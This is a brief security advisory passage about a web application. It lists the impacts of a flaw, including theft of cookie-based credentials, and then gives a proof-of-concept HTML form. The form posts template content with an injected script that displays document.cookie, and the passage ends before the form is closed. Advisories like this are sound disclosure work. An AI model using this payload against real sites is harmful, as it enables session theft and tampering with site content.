Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.

An attacker can use browser to exploit this vulnerability. The following PoC is available:

<form action="http://host/" method="post" name="main" >

<input type="hidden" name="text" value='php and html code of template<script>alert(document.cookie)</script>' />
